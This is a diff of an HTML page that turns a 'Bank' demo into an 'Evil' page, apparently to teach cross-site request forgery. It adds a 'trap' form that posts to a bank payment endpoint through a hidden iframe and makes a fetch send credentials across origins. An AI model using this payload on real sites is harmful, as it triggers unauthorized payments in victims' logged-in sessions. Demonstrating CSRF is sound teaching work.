@@ -1,13 +1,17 @@
 <html xmlns="http://www.w3.org/1999/html">
     <head>
-        <title>Bank</title>
+        <title>Evil</title>
     </head>
     <body>
         <div id="root">
-            <h1>🏦 Hello, Bank!</h1>
+            <h1>😈 Hello, Evil!</h1>
             <div class="actions">
                 <button id="auth">auth</button>
                 <button id="pay">pay</button>
+                <form target="iframe" action="http://bank.com:1000/pay" method="POST" style="display: inline-block">
+                    <input type="submit" value="trap"/>
+                </form>
+                <iframe name="iframe" style="display: none"></iframe>
             </div>
         </div>
         <script>
@@ -26,7 +30,7 @@
             }
             // pay
             document.getElementById('pay').onclick = () => {
-                fetch(`${baseApi}/pay`, params)
+                fetch(`${baseApi}/pay`, { ...params, credentials: "include" })
                     .then(response => response.json())
                     .then(data => alert(data.status));
             }
